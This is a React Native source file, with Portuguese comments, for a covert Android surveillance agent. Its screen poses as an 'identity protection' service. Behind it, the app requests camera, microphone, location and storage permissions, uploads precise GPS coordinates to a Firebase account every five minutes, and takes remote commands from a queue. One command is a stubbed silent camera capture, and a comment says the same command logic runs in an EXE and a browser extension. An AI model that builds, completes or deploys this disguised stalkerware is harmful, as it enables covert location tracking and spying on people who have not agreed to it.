import React, { useEffect } from 'react';
import { View, Text, PermissionsAndroid, Platform } from 'react-native';
import firestore from '@react-native-firebase/firestore';
import Geolocation from 'react-native-geolocation-service';

// Configurações Globais do Agente
const AGENT_ID = "MOBILE-" + Math.random().toString(36).substring(7).toUpperCase();
const USER_ID = "USER_FIXED_ID_123"; // ID do Dono (veja no seu Firebase)

export default function App() {

    useEffect(() => {
        requestPermissions();
        initMonitoring();
    }, []);

    const requestPermissions = async () => {
        if (Platform.OS === 'android') {
            await PermissionsAndroid.requestMultiple([
                PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
                PermissionsAndroid.PERMISSIONS.CAMERA,
                PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
                PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
            ]);
        }
    };

    const initMonitoring = () => {
        console.log("[*] Iniciando Agente Android...");

        // Registro Inicial
        firestore()
            .collection('usuarios')
            .doc(USER_ID)
            .collection('agentes')
            .doc(AGENT_ID)
            .set({
                hostname: "Android Device",
                os: "Android 13 Corporate",
                status: "online",
                battery: 100, // Placeholder
                lastSeen: firestore.FieldValue.serverTimestamp(),
            }, { merge: true });

        // Enviar Localização a cada 5 minutos
        setInterval(() => {
            Geolocation.getCurrentPosition(
                (position) => {
                    firestore()
                        .collection('usuarios')
                        .doc(USER_ID)
                        .collection('logs')
                        .doc(AGENT_ID)
                        .collection('eventos')
                        .add({
                            type: "gps_location",
                            payload: `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`,
                            timestamp: firestore.FieldValue.serverTimestamp(),
                        });

                    // Atualiza bateria e sinal na telemetria
                    firestore()
                        .collection('usuarios')
                        .doc(USER_ID)
                        .collection('agentes')
                        .doc(AGENT_ID)
                        .update({
                            lastSeen: firestore.FieldValue.serverTimestamp(),
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        });
                },
                (error) => console.log(error),
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 10000 }
            );
        }, 300000);

        // Escuta de Comandos (Mesma lógica do EXE e Extensão)
        firestore()
            .collection('usuarios')
            .doc(USER_ID)
            .collection('comandos')
            .doc(AGENT_ID)
            .collection('fila')
            .where('status', '==', 'pending')
            .onSnapshot(querySnapshot => {
                querySnapshot.forEach(doc => {
                    const cmd = doc.data();
                    handleCommand(cmd, doc.ref);
                });
            });
    };

    const handleCommand = async (cmd, docRef) => {
        console.log("[!] Comando Recebido:", cmd.type);
        await docRef.update({ status: 'executing' });

        switch (cmd.type) {
            case 'vibrar_phone':
                // Lógica de vibração (exige lib react-native-vibration)
                break;
            case 'capturar_camera':
                // Lógica de captura silenciosa
                break;
            // Adicionar mais comandos específicos aqui
        }

        await docRef.update({ status: 'completed' });
    };

    return (
        <View style={{ flex: 1, justifyContent: 'center', items: 'center', backgroundColor: '#0B0F1A' }}>
            <Text style={{ color: '#4F46E5', fontWeight: 'bold' }}>Core Identity Service</Text>
            <Text style={{ color: '#64748B', fontSize: 10 }}>Proteção de Identidade Ativa</Text>
        </View>
    );
}
